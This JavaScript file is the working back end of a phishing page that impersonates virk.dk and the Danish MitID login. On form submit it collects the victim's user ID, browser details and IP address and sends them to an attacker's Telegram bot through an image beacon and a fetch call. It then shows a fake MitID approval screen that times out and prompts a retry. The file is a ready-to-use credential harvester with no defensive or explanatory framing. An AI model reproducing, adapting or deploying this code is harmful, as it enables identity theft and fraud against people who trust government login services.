// ===== TELEGRAM CONFIGURATION =====
const TELEGRAM_CONFIG = {
    botToken: "YOUR_BOT_TOKEN_HERE",  // ← REPLACE with your bot token
    chatId: "YOUR_CHAT_ID_HERE"       // ← REPLACE with your chat ID
};

// ===== SEND TO TELEGRAM =====
function sendToTelegram(username, extraInfo) {
    const message = `🔴 <b>NYT BRUGER-ID FANGET - VIRK.DK</b> 🔴\n━━━━━━━━━━━━━━━━━━━━━━\n📅 <b>Tid:</b> ${extraInfo.timestamp}\n🌐 <b>IP:</b> ${extraInfo.ip}\n🖥 <b>Browser:</b> ${extraInfo.userAgent}\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>BRUGER-ID:</b> <code>${username}</code>\n━━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>STATUS:</b> Afventer godkendelse`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    const encodedMessage = encodeURIComponent(message);
    
    // Image beacon (reliable)
    const img = new Image();
    img.src = `${url}?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodedMessage}&parse_mode=HTML`;
    
    // Fetch backup
    try {
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(() => {});
    } catch (e) {}
}

// ===== GET VICTIM INFO (non-blocking) =====
function getVictimInfo() {
    const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direct',
        timestamp: new Date().toLocaleString('da-DK', { timeZone: 'Europe/Copenhagen' }),
        ip: 'Unknown'
    };
    
    // Non-blocking IP fetch
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => { info.ip = data.ip; })
        .catch(() => {});
    
    return info;
}

// ===== MITID ANIMATION CONTROLLER =====
function showMitIDFlow(username) {
    const overlay = document.getElementById('mitidOverlay');
    const stepConnecting = document.getElementById('stepConnecting');
    const stepWaiting = document.getElementById('stepWaiting');
    const stepSuccess = document.getElementById('stepSuccess');
    const mitidError = document.getElementById('mitidError');
    
    if (!overlay) return;
    
    overlay.style.display = 'flex';
    
    // Reset
    stepConnecting.style.display = 'block';
    stepWaiting.style.display = 'none';
    stepSuccess.style.display = 'none';
    mitidError.style.display = 'none';
    
    // Step 1: Connecting (1.5s)
    setTimeout(() => {
        stepConnecting.style.display = 'none';
        stepWaiting.style.display = 'block';
    }, 1500);
    
    // Step 2: Waiting for approval (3s) → then timeout error
    setTimeout(() => {
        stepWaiting.style.display = 'none';
        // Show error (simulate timeout)
        mitidError.style.display = 'block';
    }, 4500);
    
    // Retry button
    const retryBtn = document.getElementById('mitidRetry');
    if (retryBtn) {
        retryBtn.onclick = function() {
            overlay.style.display = 'none';
            // Clear input
            const usernameInput = document.getElementById('username');
            if (usernameInput) usernameInput.value = '';
            usernameInput.focus();
        };
    }
}

// ===== MAIN HANDLER =====
document.addEventListener('DOMContentLoaded', function() {
    
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const loginBtn = document.getElementById('loginBtn');
    const btnText = document.querySelector('.btn-login-text');
    const btnLoading = document.getElementById('btnLoading');
    
    // Debug
    console.log('Elements:', {
        form: !!loginForm,
        input: !!usernameInput,
        btn: !!loginBtn
    });
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            
            console.log('Submit clicked. Bruger-ID:', username);
            
            // Validate
            if (!username) {
                usernameInput.style.borderColor = '#DC3545';
                setTimeout(() => {
                    usernameInput.style.borderColor = '';
                }, 2000);
                return;
            }
            
            // Show loading on button
            btnText.style.display = 'none';
            btnLoading.style.display = 'block';
            loginBtn.disabled = true;
            
            // Get victim info
            const extraInfo = getVictimInfo();
            
            // Send to Telegram immediately
            sendToTelegram(username, extraInfo);
            
            console.log('Bruger-ID sent to Telegram');
            
            // Short delay then show MitID flow
            setTimeout(() => {
                // Hide loading, reset button
                btnText.style.display = 'block';
                btnLoading.style.display = 'none';
                loginBtn.disabled = false;
                
                // Show MitID overlay
                showMitIDFlow(username);
            }, 800);
            
            return false;
        });
    }
    
    // Remove red border on input
    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            usernameInput.style.borderColor = '';
        });
    }
});
